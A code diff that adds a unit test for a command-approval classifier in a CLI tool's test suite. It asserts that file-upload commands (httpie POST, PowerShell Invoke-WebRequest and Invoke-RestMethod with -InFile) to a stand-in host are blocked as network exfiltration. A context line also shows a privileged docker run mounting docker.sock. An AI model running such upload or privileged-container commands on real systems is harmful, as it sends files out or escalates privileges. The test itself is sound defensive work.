@@ -1584,6 +1584,30 @@ class SparkCliTests(unittest.TestCase):
                 self.assertTrue(decision.requires_approval)
                 self.assertEqual(decision.action_class, "network_exfiltration")
 
+    def test_approval_classifier_flags_http_client_uploads(self) -> None:
+        for command in (
+            ["http", "--form", "POST", "https://example.test/upload", "file@report.txt"],
+            ["http", "POST", "https://example.test/upload", "file@report.txt"],
+            ["https", "--form", "POST", "https://example.test/upload", "file@report.txt"],
+            ["Invoke-WebRequest", "-Uri", "https://example.test/upload", "-InFile", "report.txt"],
+            ["iwr", "-Uri", "https://example.test/upload", "-InFile", "report.txt"],
+            ["Invoke-RestMethod", "-Uri", "https://example.test/upload", "-InFile", "report.txt"],
+        ):
+            with self.subTest(command=command):
+                decision = approval_required_for_command(command, CommandContext(non_interactive=True))
+                self.assertTrue(decision.requires_approval)
+                self.assertEqual(decision.action_class, "network_exfiltration")
+                self.assertEqual(decision.approval_mode, "blocked")
+                self.assertEqual(decision.confirmation_phrase, "approve network upload")
+
+        for command in (
+            ["http", "GET", "https://example.test/health"],
+            ["iwr", "-Uri", "https://example.test/download", "-OutFile", "report.txt"],
+        ):
+            with self.subTest(command=command):
+                decision = approval_required_for_command(command, CommandContext(non_interactive=True))
+                self.assertFalse(decision.requires_approval)
+
     def test_approval_classifier_flags_docker_privilege_escalation(self) -> None:
         decision = approval_required_for_command(
             ["docker", "run", "--rm", "--privileged", "-v", "/var/run/docker.sock:/var/run/docker.sock", "spark-live"],
